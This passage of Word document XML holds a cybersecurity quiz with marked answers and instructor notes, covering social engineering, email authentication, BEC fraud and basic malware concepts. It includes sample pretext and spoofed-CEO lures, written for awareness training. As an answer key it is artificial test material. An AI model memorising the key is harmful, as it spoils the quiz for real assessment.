        <w:t>*Instructor Note:* SilverTerrier = documented by Palo Alto Unit 42. BEC = $1.8B lost globally in 2020 (FBI). Nigerian-linked group operating internationally.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q111</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>SIM swap fraud works by:</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) Installing malware on a victim's SIM card remotely</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) Intercepting SMS messages between towers and phones</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">C) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Convincing a mobile network operator to transfer a victim's phone number to the attacker's SIM</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>D) Physically stealing and cloning a victim's SIM card</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [CONCEPT] · *Time:* 45 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* Social engineering the telco agent. With victim's number, attacker receives all OTPs. Prevention: don't use SMS-based 2FA for banking; use authenticator apps.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q112</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>SPF (Sender Policy Framework) helps prevent email spoofing by:</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) Encrypting email content end-to-end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) Adding a digital signature to each outgoing email</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">C) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Publishing a DNS record listing which mail servers are authorised to send email for a domain</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>D) Scanning email content for phishing keywords before delivery</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [CONCEPT] · *Time:* 45 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* SPF = list of authorised senders. DKIM = cryptographic signature. DMARC = policy (reject/quarantine/none) + reporting. All three together = email authentication stack.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q113</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>What is "pretexting" in social engineering?</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) Sending fake text messages (smishing) disguised as legitimate companies</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) Adding false metadata to phishing emails to avoid spam filters</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">C) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Creating a fabricated scenario (pretext) to establish trust and extract information from a target</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>D) Pre-loading a victim's inbox with messages to normalise requests</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [CONCEPT] · *Time:* 45 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* "I'm calling from IT support — we're upgrading your account and need to verify your password." The scenario = the pretext.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q114</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>An employee receives a USB drive labelled "Q4 Salaries" in the office car park. They plug it in. This is:</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) Tailgating</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) Vishing</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>C) Spear phishing</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">D) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Baiting</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [RECALL] · *Time:* 20 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* Baiting = offering something tempting (curiosity, greed). USB drops are effective — 45-90% of dropped USBs get plugged in (Google/University of Illinois study).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q115</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Which Cialdini principle does a phishing email use when it says "Your colleague John already verified his details — please do the same"?</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) Authority</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) Urgency</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">C) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Social Proof</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>D) Commitment</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [CONCEPT] · *Time:* 45 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* "Everyone else is doing it" = social proof. People assume if others complied, the request is legitimate.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q116</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>DMARC policy `p=reject` means:</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) Emails are delivered and a report is sent to the domain owner</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) Suspicious emails are held in quarantine for review</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">C) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Emails failing SPF and DKIM checks are rejected and not delivered</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>D) All incoming emails to the domain are rejected</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [CONCEPT] · *Time:* 45 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* p=none (monitor), p=quarantine (junk folder), p=reject (blocked). Most Nigerian organisations are on p=none — vulnerable to spoofing.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q117</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Business Email Compromise (BEC) typically involves:</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) Malware sent via email that automatically transfers funds</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) Hacking the banking system's core network directly</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">C) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Compromised or spoofed executive email accounts used to authorise fraudulent fund transfers</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>D) DDoS attacks on a company's email servers to disrupt operations</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [CONCEPT] · *Time:* 45 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* No malware needed. Just a spoofed "CEO email" to finance: "Transfer ₦50M to this new supplier account urgently." High-trust + urgency = effective.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q118</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>The best defence against SIM swap fraud for bank account security is:</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) Using a very complex PIN for your SIM card</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) Registering multiple phone numbers with your bank</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>C) Informing your bank if you change your SIM</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">D) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Using an authenticator app (TOTP) instead of SMS-based OTP for 2FA</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [CONCEPT] · *Time:* 45 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* TOTP (Google Authenticator, Authy) generates codes on-device — SIM swap doesn't capture them. SMS OTP = vulnerable to SIM swap.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q119</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Have I Been Pwned (haveibeenpwned.com) is used to:</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) Report phishing emails to cybersecurity authorities</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) Test whether a website is vulnerable to email spoofing</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">C) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Check whether an email address or password has appeared in known data breaches</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>D) Automatically reset passwords on accounts that have been breached</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [RECALL] · *Time:* 30 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* Created by Troy Hunt. Over 13 billion breached accounts indexed. Valuable for both users (check exposure) and SOC analysts (credential stuffing investigation).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q120</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ★ DOUBLE POINTS</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>A CFO receives an email from "ceo@acme-corp.ng" (note: company domain is acme-corp.com.ng) requesting an urgent ₦15M transfer to a "new vendor" before end of business. The email references a real ongoing deal. What red flags exist and what should the CFO do?</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) No red flags; the CEO may be using a different email domain for security. Approve the transfer</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) One red flag: urgency. Verify by calling the CEO but proceed if call goes unanswered</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">C) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Multiple red flags: domain typosquat (.ng vs .com.ng), urgency, new vendor not in system. Call CEO on registered number; do NOT use contact details in the email. Freeze pending verification</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>D) Forward the email to IT and proceed with the transfer to avoid delaying the CEO</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [SCENARIO] · *Time:* 60 s · *Points:* 2,000 ★</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* Classic BEC scenario. Debrief: Nigerian companies lose billions annually to BEC. Domain typosquatting is a giveaway. Out-of-band verification (phone call) is the only reliable defence. Never use contact info in a suspicious email.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>MODULE 9 [ADVANCED]: Malware Analysis</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Level: Advanced | Questions: Q121–Q135*</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q121</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Which type of malware encrypts the victim's files and demands payment for the decryption key?</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) Banking Trojan</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) RAT (Remote Access Trojan)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">C) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Ransomware</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>D) Adware</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [RECALL] · *Time:* 20 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* WannaCry (2017) = most famous. Hospitals, government agencies, universities all hit. Nigeria: Kaduna State Government hit by ransomware.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q122</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>What is the key difference between a virus and a worm?</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) Viruses target only Windows; worms target Linux</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) Worms require antivirus to spread; viruses do not</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">C) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Viruses attach to host files and require user action to spread; worms self-replicate across networks autonomously</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>D) Viruses are more dangerous than worms in all scenarios</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [CONCEPT] · *Time:* 45 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* Worms = no user interaction needed. WannaCry spread as a worm using EternalBlue SMB exploit.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q123</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>A keylogger is malware that:</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) Deletes files from the victim's system to cause disruption</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) Mines cryptocurrency using the victim's CPU without consent</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>C) Creates a hidden backdoor for remote command execution</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">D) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Records all keyboard input, capturing passwords, credit card numbers, and messages</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [RECALL] · *Time:* 20 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* Keyloggers are often combined with banking trojans — capture credentials at point of entry before encryption.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q124</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Static malware analysis involves:</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) Running the malware in a controlled environment and observing its behaviour</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) Using Shodan to find other systems infected by the same malware</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">C) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Examining the malware's code, strings, headers, and hashes WITHOUT executing it</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>D) Monitoring network traffic during malware execution</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [CONCEPT] · *Time:* 45 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* Static = safe (no execution). Dynamic = malware runs in sandbox. Start static for quick IOCs before running.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q125</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>ANY.RUN is a malware analysis platform that performs:</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) Static analysis by disassembling malware binaries</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) Network scanning to find malware-infected systems</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">C) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Dynamic (behavioural) analysis by executing malware in an interactive cloud sandbox</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>D) OSINT analysis of malware authors and infrastructure</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [RECALL] · *Time:* 30 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* ANY.RUN = interactive sandbox. Watch the malware execute in real time, see network connections, registry changes, file drops. Free tier available.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
